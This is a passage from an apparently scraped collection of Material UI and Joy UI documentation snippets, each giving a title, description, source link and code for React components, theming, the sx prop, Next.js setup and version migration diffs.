=== 0) {\n      return null;\n    }\n    const sortedValue = params.values.sort((a = '', b = '') =>\n      a.localeCompare(b),\n    );\n    return sortedValue[0];\n  },\n  // The `label` defines what's displayed in the column header when this\n  // aggregation is active.\n  label: 'First Alphabetical',\n  // The `types` property defines which type of columns can use this\n  // aggregation function. Here, we only want to propose this aggregation\n  // function for `string` columns. If not defined, aggregation will be\n  // available for all column types.\n  columnTypes: ['string'],\n};\n```\n\n----------------------------------------\n\nTITLE: Basic Select Input Implementation\nDESCRIPTION: Example showing basic usage of Select component with InputLabel and MenuItem elements\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/selects/selects.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n<InputLabel id=\"label\">Age</InputLabel>\n<Select labelId=\"label\" id=\"select\" value=\"20\">\n  <MenuItem value=\"10\">Ten</MenuItem>\n  <MenuItem value=\"20\">Twenty</MenuItem>\n</Select>\n```\n\n----------------------------------------\n\nTITLE: Toggling Color Schemes with useColorScheme Hook in JSX\nDESCRIPTION: This JSX snippet demonstrates using the `useColorScheme` hook from `@mui/material/styles` to read the current color mode (`mode`) and provide a function (`setMode`) to switch between 'system', 'light', and 'dark' modes. This allows users to control the application's theme preference.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nimport { useColorScheme } from '@mui/material/styles';\n\nfunction ModeSwitcher() {\n  const { mode, setMode } = useColorScheme();\n  if (!mode) return null;\n  return (\n    <select onChange={(event) => setMode(event.target.value)}>\n      <option value=\"system\">System</option>\n      <option value=\"light\">Light</option>\n      <option value=\"dark\">Dark</option>\n    </select>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing sx Prop with Custom Components using unstable_styleFunctionSx\nDESCRIPTION: Example of adding MUI System's sx prop functionality to a custom component using the unstable_styleFunctionSx utility. This approach provides the same styling capabilities as Box component but with reduced bundle size.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/custom-components/custom-components.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport { unstable_styleFunctionSx } from '@mui/system';\nimport styled from '@mui/system/styled';\n\nconst Section = styled('div')(unstable_styleFunctionSx);\n\nexport default function StyleFunctionSxDemo() {\n  return (\n    <Section\n      sx={{\n        border: 1,\n        borderColor: 'primary.main',\n        p: 2,\n        'span': {\n          color: 'text.primary',\n        },\n      }}\n    >\n      <span>Inner content</span>\n    </Section>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Disabled Elements with Tooltip in React\nDESCRIPTION: This snippet demonstrates how to properly use a Tooltip with a disabled button element. It includes a workaround for Safari compatibility and shows how to handle pointer events for non-Material UI components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/tooltips/tooltips.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n<Tooltip title=\"You don't have permission to do this\">\n  <span>\n    <button disabled={disabled} style={disabled ? { pointerEvents: 'none' } : {}}>\n      A disabled button\n    </button>\n  </span>\n</Tooltip>\n```\n\n----------------------------------------\n\nTITLE: Applying Container Queries in Styled Components (JSX & CSS)\nDESCRIPTION: This snippet demonstrates using Material UI v6's container queries utility within a styled component (JSX). It applies different `flexDirection` styles based on the container's width using `theme.containerQueries.up('sm')` (default container) and `theme.containerQueries('sidebar').up('400px')` (named container 'sidebar'). The simplified CSS output shows the corresponding `@container` rules.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx JSX\nCODE:\n```\nconst Component = styled('div')(({ theme }) => ({\n  display: 'flex',\n  flexDirection: 'column',\n  gap: theme.spacing(2),\n  [theme.containerQueries.up('sm')]: {\n    flexDirection: 'row',\n  },\n  [theme.containerQueries('sidebar').up('400px')]: {\n    // @container sidebar (min-width: 400px)\n    flexDirection: 'row',\n  },\n}));\n```\n\nLANGUAGE: css CSS\nCODE:\n```\n/* Simplified CSS Output */\n\n.Component-ad83f {\n  display: flex;\n  flex-direction: column;\n  gap: 16px;\n  @container (min-width: 600px) {\n    flex-direction: row;\n  }\n  @container sidebar (min-width: 400px) {\n    flex-direction: row;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using theme.applyStyles with sx Prop in Button Component\nDESCRIPTION: This example shows how to use theme.applyStyles with the sx prop on a Button component. It applies different styling for dark mode, changing the background color to secondary colors in dark mode.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/dark-mode/dark-mode.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\nimport Button from '@mui/material/Button';\n\n<Button\n  sx={[\n    (theme) => ({\n      color: '#fff',\n      backgroundColor: theme.palette.primary.main,\n      '&:hover': {\n        boxShadow: theme.shadows[3],\n        backgroundColor: theme.palette.primary.dark,\n      },\n    }),\n    (theme) =>\n      theme.applyStyles('dark', {\n        backgroundColor: theme.palette.secondary.main,\n        '&:hover': {\n          backgroundColor: theme.palette.secondary.dark,\n        },\n      }),\n  ]}\n>\n  Submit\n</Button>;\n```\n\n----------------------------------------\n\nTITLE: Implementing Clickable Steps in React Stepper\nDESCRIPTION: This code shows how to make steps clickable by using the StepButton component. It allows users to navigate between steps by clicking on them, enhancing interactivity.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stepper/stepper.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Stepper>\n  <Step>\n    <StepButton>Select campaign settings</StepButton>\n  </Step>\n  <Step>\n    <StepButton>Create an ad group</StepButton>\n  </Step>\n  <Step>\n    <StepButton>Create an ad</StepButton>\n  </Step>\n</Stepper>\n```\n\n----------------------------------------\n\nTITLE: Customizing List Component in React using Joy UI\nDESCRIPTION: This snippet demonstrates how to customize the List component using built-in CSS variables to match the design of the Gatsby documentation side nav. The example shows a collapsible list implementation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/overview/overview.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"../../components/list/ExampleCollapsibleList.js\"}\n```\n\n----------------------------------------\n\nTITLE: Account Menu with Avatar\nDESCRIPTION: Menu implementation combined with Avatar component for account-related actions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_6\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"AccountMenu.js\"}\n```\n\n----------------------------------------\n\nTITLE: Responsive Columns in Masonry\nDESCRIPTION: Shows how to implement responsive column layouts in Masonry using breakpoints.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/masonry/masonry.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nResponsiveColumns.js\n```\n\n----------------------------------------\n\nTITLE: Creating Indeterminate Checkboxes in React\nDESCRIPTION: Shows how to implement and customize indeterminate checkboxes using the indeterminateIcon prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/checkboxes/checkboxes.md#2025-04-22_snippet_6\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"IndeterminateCheckbox.js\"}\n```\n\n----------------------------------------\n\nTITLE: Using clsx Utility for Conditional Classnames\nDESCRIPTION: Example showing how to use the clsx utility to construct conditional className strings in React components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/faq/faq.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nimport clsx from 'clsx';\n\nreturn (\n  <div\n    className={clsx('MuiButton-root', {\n      'Mui-disabled': disabled,\n      'Mui-selected': selected,\n    })}\n  />\n);\n```\n\n----------------------------------------\n\nTITLE: Rendering Image Avatars in React\nDESCRIPTION: Demonstrates how to create image avatars by passing standard 'img' props 'src' or 'srcSet' to the Avatar component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"ImageAvatars.js\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring Webpack for SVG Icons\nDESCRIPTION: Webpack configuration to use svgr for importing SVG files as React components, which can be used with the SvgIcon component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/icons/icons.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n// webpack.config.js\n{\n  test: /\\.svg$/,\n  use: ['@svgr/webpack'],\n}\n\n// ---\nimport StarIcon from './star.svg';\n\n<SvgIcon component={StarIcon} inheritViewBox />\n```\n\n----------------------------------------\n\nTITLE: Customizing Stepper Connector in React\nDESCRIPTION: This code shows how to customize the connector between steps using the 'sx' prop. It targets the '::after' pseudo-element of the Step component to modify the connector's appearance.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stepper/stepper.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\n<Stepper>\n  <Step\n    sx={{\n      '&::after': {\n        borderStyle: 'dashed',\n        borderWidth: '1px',\n      },\n    }}\n  >\n    Select campaign settings\n  </Step>\n  <Step>\n    Create an ad group\n  </Step>\n  <Step>\n    Create an ad\n  </Step>\n</Stepper>\n```\n\n----------------------------------------\n\nTITLE: Implementing Slider with Removed Track in React\nDESCRIPTION: Demonstrates how to create a slider without a visible track by setting the 'track' prop to false in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_15\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"TrackFalseSlider.js\"}\n```\n\n----------------------------------------\n\nTITLE: Updating Grid2 Import Path\nDESCRIPTION: Shows how to update imports for Grid2 component which was stabilized in v6 by removing the Unstable_ prefix from import paths.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n-import { Unstable_Grid2 as Grid2 } from '@mui/material';\n+import { Grid2 } from '@mui/material';\n```\n\n----------------------------------------\n\nTITLE: Defining Primary Color Tokens in Material UI\nDESCRIPTION: Demonstrates how to define the main color tokens (main, light, dark, contrastText) for the primary color in Material UI's default theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/palette/palette.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst primary = {\n  main: '#1976d2',\n  light: '#42a5f5',\n  dark: '#1565c0',\n  contrastText: '#fff',\n};\n```\n\n----------------------------------------\n\nTITLE: Basic Theme Breakpoint Usage in React\nDESCRIPTION: Demonstrates how to use the useMediaQuery hook with Material-UI theme breakpoints for responsive design.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/use-media-query/use-media-query.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { useTheme } from '@mui/material/styles';\nimport useMediaQuery from '@mui/material/useMediaQuery';\n\nfunction MyComponent() {\n  const theme = useTheme();\n  const matches = useMediaQuery(theme.breakpoints.up('sm'));\n\n  return <span>{`theme.breakpoints.up('sm') matches: ${matches}`}</span>;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Value Set Enforcement in Toggle Buttons\nDESCRIPTION: Code example showing how to ensure at least one toggle button remains active by implementing custom change handlers for both single and multiple selection scenarios.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/toggle-button/toggle-button.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nconst handleAlignment = (event, newAlignment) => {\n  if (newAlignment !== null) {\n    setAlignment(newAlignment);\n  }\n};\n\nconst handleDevices = (event, newDevices) => {\n  if (newDevices.length) {\n    setDevices(newDevices);\n  }\n};\n```\n\n----------------------------------------\n\nTITLE: Creating Responsive Circular Skeleton\nDESCRIPTION: Example of creating a responsive circular Skeleton component with different dimensions on mobile and desktop using object notation for width and height properties.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/skeleton/skeleton.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n<Skeleton\n  variant=\"circular\"\n  width={{ xs: 40, md: 48 }}\n  height={{ xs: 40, md: 48 }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Adding Nonce to Server-Rendered Style Tags in JSX\nDESCRIPTION: JSX snippet showing how to include the nonce attribute in server-rendered style tags for CSP compliance.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/content-security-policy/content-security-policy.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<style\n  data-emotion={`${style.key} ${style.ids.join(' ')}`}\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: style.css }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Light and Dark Color Schemes in Material UI Theme\nDESCRIPTION: Sets up both light and dark color schemes in a Material UI theme using the colorSchemes API. This example generates default tokens for both schemes without customization.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/palette/palette.md#2025-04-22_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\n\nconst theme = createTheme({\n  colorSchemes: {\n    light: true,\n    dark: true,\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Initializing Basic Menu Components in React with Joy UI\nDESCRIPTION: This snippet demonstrates how to import and use the basic menu components from Joy UI. It includes the Dropdown, MenuButton, Menu, and MenuItem components to create a simple menu structure.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/menu/menu.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Menu from '@mui/joy/Menu';\nimport MenuButton from '@mui/joy/MenuButton';\nimport MenuItem from '@mui/joy/MenuItem';\nimport Dropdown from '@mui/joy/Dropdown';\n\nexport default function MyApp() {\n  return (\n    <Dropdown>\n      <MenuButton>Actions</MenuButton>\n      <Menu>\n        <MenuItem>Add item</MenuItem>\n      </Menu>\n    </Dropdown>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom styled Utility with a Default Theme - JavaScript\nDESCRIPTION: This JavaScript snippet illustrates how to create a customized styled utility with a user-defined default theme. It requires '@mui/system' to access createStyled and createTheme functions. The defaultTheme can be tailored to fit your design requirements. The styled function exported here will use your custom theme for all styled component instances.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/styled/styled.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createStyled, createTheme } from '@mui/system';\n\nconst defaultTheme = createTheme({\n  // your custom theme values\n});\n\nconst styled = createStyled({ defaultTheme });\n\nexport default styled;\n```\n\n----------------------------------------\n\nTITLE: Named Containment Context Query in Material UI\nDESCRIPTION: Shows how to create container queries with named containment contexts for specific container references.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/container-queries/container-queries.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\ntheme.containerQueries('sidebar').up('500px'); // => '@container sidebar (min-width: 500px)'\n```\n\n----------------------------------------\n\nTITLE: Using Array Syntax for Conditional Style Overrides in sx Prop (Material UI JSX)\nDESCRIPTION: Demonstrates using an array as the value for the `sx` prop to apply styles conditionally. Later elements in the array override styles from earlier elements if their conditions (e.g., boolean flags like `foo`, `bar`) are met. This example focuses on merging `:hover` styles based on these flags.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_19\n\nLANGUAGE: jsx\nCODE:\n```\n<Box\n  sx={[\n    {\n      '&:hover': {\n        color: 'red',\n        backgroundColor: 'white',\n      },\n    },\n    foo && {\n      '&:hover': { backgroundColor: 'grey' },\n    },\n    bar && {\n      '&:hover': { backgroundColor: 'yellow' },\n    },\n  ]}\n/>\n```\n\n----------------------------------------\n\nTITLE: Importing and Using Sheet Component in Joy UI\nDESCRIPTION: Basic example of importing and using the Sheet component from Joy UI. The Sheet component acts as a generic container that supports Joy UI's global variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/sheet/sheet.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Sheet from '@mui/joy/Sheet';\n\nexport default function MyApp() {\n  return <Sheet>Holy sheet!</Sheet>;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Next.js Font Optimization with Material UI\nDESCRIPTION: Implementation of Next.js font optimization using the Roboto font with Material UI theming configuration in _app.tsx.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_18\n\nLANGUAGE: diff\nCODE:\n```\n import * as React from 'react';\n import Head from 'next/head';\n import { AppProps } from 'next/app';\n import { AppCacheProvider } from '@mui/material-nextjs/v15-pagesRouter';\n+import { ThemeProvider, createTheme } from '@mui/material/styles';\n+import { Roboto } from 'next/font/google';\n\n+const roboto = Roboto({\n+  weight: ['300', '400', '500', '700'],\n+  subsets: ['latin'],\n+  display: 'swap',\n+  variable: '--font-roboto',\n+});\n\n+const theme = createTheme({\n+  typography: {\n+    fontFamily: 'var(--font-roboto)',\n+  },\n+});\n\n export default function MyApp(props: AppProps) {\n  const { Component, pageProps } = props;\n  return (\n    <AppCacheProvider {...props}>\n      <Head>...</Head>\n+     <ThemeProvider theme={theme}>\n+       <main className={roboto.variable}>\n          <Component {...pageProps} />\n+       </main>\n+     </ThemeProvider>\n    </AppCacheProvider>\n  );\n }\n```\n\n----------------------------------------\n\nTITLE: Importing Pigment CSS Styles in Next.js Layout\nDESCRIPTION: A diff snippet showing how to import the Pigment CSS styles at the top of a Next.js layout file.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_3\n\nLANGUAGE: diff\nCODE:\n```\n import type { Metadata } from 'next';\n import { Inter } from 'next/font/google';\n\n+import '@mui/material-pigment-css/styles.css';\n\n export default function RootLayout(props) {\n   return (\n     <html lang=\"en\">\n       <body className={`${inter.className}`}>\n         {props.children}\n       </body>\n     </html>\n   );\n }\n```\n\n----------------------------------------\n\nTITLE: Removing Modern Bundle Aliases\nDESCRIPTION: Diff showing how to remove the configuration for modern bundle aliases which are no longer needed in v7 as the modern bundles have been removed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n {\n   resolve: {\n     alias: {\n-      '@mui/material': '@mui/material/modern',\n-      '@mui/styled-engine': '@mui/styled-engine/modern',\n-      '@mui/system': '@mui/system/modern',\n-      '@mui/base': '@mui/base/modern',\n-      '@mui/utils': '@mui/utils/modern',\n-      '@mui/lab': '@mui/lab/modern',\n     }\n   }\n }\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Next.js Dependencies for Pages Router with npm\nDESCRIPTION: Command to install the required dependencies for integrating Material UI with Next.js Pages Router using npm package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/material-nextjs @emotion/cache @emotion/server\n```\n\n----------------------------------------\n\nTITLE: Preventing Autofill in Autocomplete TextField\nDESCRIPTION: Shows how to prevent browser autofill suggestions in the Autocomplete component by setting specific autoComplete attributes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/autocomplete/autocomplete.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\n<TextField\n  {...params}\n  inputProps={{\n    ...params.inputProps,\n    autoComplete: 'new-password',\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Implementing Alternating Timeline in React\nDESCRIPTION: Illustrates a timeline that displays events on alternating sides.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/timeline/timeline.md#2025-04-22_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"AlternateTimeline.js\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring Pigment CSS with Vite\nDESCRIPTION: Configuration setup for integrating Pigment CSS with Vite using the pigment plugin.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/experimental-api/pigment-css/pigment-css.md#2025-04-22_snippet_3\n\nLANGUAGE: typescript\nCODE:\n```\n// main.tsx\nimport { pigment } from '@pigment-css/vite-plugin';\n\nexport default defineConfig({\n  plugins: [\n    pigment(),\n    // ... Your other plugins.\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Custom Image List Implementation\nDESCRIPTION: Shows implementation of a customized image list with custom gradient backgrounds, positioned title bars, and adjusted gap spacing.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/image-list/image-list.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"CustomImageList.js\", \"defaultCodeOpen\": false}\n```\n\n----------------------------------------\n\nTITLE: Implementing List Items with Automatic Tag Adjustment in Joy UI\nDESCRIPTION: Shows how ListItem components automatically adjust their HTML tag rendering based on their parent List component's type. When List is not a semantic list element, ListItem renders as a div instead of li.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/main-features/automatic-adjustment/automatic-adjustment.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n<List component=\"div\">\n  <ListItem> // automatically renders as a <div>\n    ...\n  </ListItem>\n</List>\n```\n\n----------------------------------------\n\nTITLE: Button-based Link Implementation for Accessibility\nDESCRIPTION: Demonstrates how to properly implement a link using a button element when there is no meaningful href, following accessibility best practices.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/links/links.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"ButtonLink.js\"}\n```\n\n----------------------------------------\n\nTITLE: Wrapping Disabled Button for Custom Cursor in React\nDESCRIPTION: Demonstrates an alternative approach to customizing the cursor for disabled buttons by wrapping the Button component in a span element with a custom style.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/buttons/buttons.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n<span style={{ cursor: 'not-allowed' }}>\n  <Button component={Link} disabled>\n    disabled\n  </Button>\n</span>\n```\n\n----------------------------------------\n\nTITLE: Initializing CssVarsProvider in Joy UI\nDESCRIPTION: Basic setup for using CSS variables by wrapping the app with CssVarsProvider component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/using-css-variables/using-css-variables.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { CssVarsProvider } from '@mui/joy/styles';\n\nfunction App() {\n  return <CssVarsProvider>...</CssVarsProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Translucent Colors with Color Channel Tokens\nDESCRIPTION: Demonstrates how to use color channel tokens to create translucent colors. This example customizes the Chip component's background color with translucency.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/usage.md#2025-04-22_snippet_3\n\nLANGUAGE: js\nCODE:\n```\nconst theme = createTheme({\n  cssVariables: true,\n  components: {\n    MuiChip: {\n      styleOverrides: {\n        root: ({ theme }) => ({\n          variants: [\n            {\n              props: { variant: 'outlined', color: 'primary' },\n              style: {\n                backgroundColor: `rgba(${theme.vars.palette.primary.mainChannel} / 0.12)`,\n              },\n            },\n          ],\n        }),\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Checkboxes in React\nDESCRIPTION: Demonstrates the basic usage of checkboxes in a React component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/checkboxes/checkboxes.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"Checkboxes.js\"}\n```\n\n----------------------------------------\n\nTITLE: Customizing Typography Variants in Material UI\nDESCRIPTION: Demonstrates how to customize individual typography variants with specific styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/typography/typography.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme({\n  typography: {\n    subtitle1: {\n      fontSize: 12,\n    },\n    body1: {\n      fontWeight: 500,\n    },\n    button: {\n      fontStyle: 'italic',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Switch Component with MUI Base Hook in TypeScript\nDESCRIPTION: This snippet demonstrates how to create a custom Switch component using the useSwitch hook from MUI Base. It shows how to apply the hook's returned props to custom elements, allowing for full control over the component's structure and styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/introducing-base-ui.md#2025-04-22_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\nfunction MySwitch(props: UseSwitchParameters) {\n  const { getInputProps, checked, disabled } = useSwitch(props);\n\n  return (\n    <span className={clsx('root', { checked, disabled })}>\n      <span className=\"thumb\" />\n      <input className=\"input\" {...getInputProps()} />\n    </span>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Labels to Checkboxes using FormControlLabel\nDESCRIPTION: Shows how to add labels to checkboxes using the FormControlLabel component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/checkboxes/checkboxes.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CheckboxLabels.js\"}\n```\n\n----------------------------------------\n\nTITLE: Forcing Label Shrink State with InputLabel Component\nDESCRIPTION: Shows an alternative method to force the 'shrink' state using the InputLabel component directly.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/text-fields/text-fields.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n<InputLabel shrink>Count</InputLabel>\n```\n\n----------------------------------------\n\nTITLE: Overriding Existing SX Prop Behavior in Material-UI\nDESCRIPTION: Demonstrates how to change the default behavior of existing sx prop properties by providing a custom configuration. The example shows restricting borderRadius to specific values instead of allowing any number.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/experimental-api/configure-the-sx-prop/configure-the-sx-prop.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nChangeTheBehaviorSxProp.js\n```\n\n----------------------------------------\n\nTITLE: Using theme.breakpoints.down Example\nDESCRIPTION: Example of using theme.breakpoints.down to apply styles for screens narrower than the md breakpoint.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/breakpoints/breakpoints.md#2025-04-22_snippet_5\n\nLANGUAGE: js\nCODE:\n```\nconst styles = (theme) => ({\n  root: {\n    backgroundColor: 'blue',\n    // Match [0, md)\n    //       [0, 900px)\n    [theme.breakpoints.down('md')]: {\n      backgroundColor: 'red',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Importing Dialog Components in React\nDESCRIPTION: Basic import statements for using Dialog and DialogTitle components from Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/dialogs/dialogs.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Dialog from '@mui/material/Dialog';\nimport DialogTitle from '@mui/material/DialogTitle';\n```\n\n----------------------------------------\n\nTITLE: Styling Stat Component with ownerState in Material UI\nDESCRIPTION: This snippet demonstrates how to style the Stat component using ownerState. It adds a variant prop and uses it to conditionally apply styles to the root slot.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/creating-themed-components/creating-themed-components.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst Stat = React.forwardRef(function Stat(props, ref) {\n  const { value, unit, variant, ...other } = props;\n\n  const ownerState = { ...props, variant };\n\n  return (\n    <StatRoot ref={ref} ownerState={ownerState} {...other}>\n      <StatValue ownerState={ownerState}>{value}</StatValue>\n      <StatUnit ownerState={ownerState}>{unit}</StatUnit>\n    </StatRoot>\n  );\n});\n\nconst StatRoot = styled('div', {\n  name: 'MuiStat',\n  slot: 'root',\n})(({ theme, ownerState }) => ({\n  display: 'flex',\n  flexDirection: 'column',\n  gap: theme.spacing(0.5),\n  padding: theme.spacing(3, 4),\n  backgroundColor: theme.palette.background.paper,\n  borderRadius: theme.shape.borderRadius,\n  boxShadow: theme.shadows[2],\n  letterSpacing: '-0.025em',\n  fontWeight: 600,\n  ...ownerState.variant === 'outlined' && {\n    border: `2px solid ${theme.palette.divider}`,\n  },\n}));\n```\n\n----------------------------------------\n\nTITLE: Configuring Storybook Webpack for Emotion with Material UI v5\nDESCRIPTION: Updates the Storybook webpack configuration to support Emotion with Material UI v5. Creates aliases for Emotion packages to ensure compatibility.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/troubleshooting.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n// .storybook/main.js\n\nconst path = require('path');\nconst toPath = (filePath) => path.join(process.cwd(), filePath);\n\nmodule.exports = {\n  webpackFinal: async (config) => {\n    return {\n      ...config,\n      resolve: {\n        ...config.resolve,\n        alias: {\n          ...config.resolve.alias,\n          '@emotion/core': toPath('node_modules/@emotion/react'),\n          'emotion-theming': toPath('node_modules/@emotion/react'),\n        },\n      },\n    };\n  },\n};\n```\n\n----------------------------------------\n\nTITLE: Implementing Switch with Accessibility Label in React\nDESCRIPTION: Example showing how to implement a Switch component with proper accessibility labels using inputProps. This demonstrates best practices for making switches accessible to assistive technologies.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/switches/switches.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n<Switch 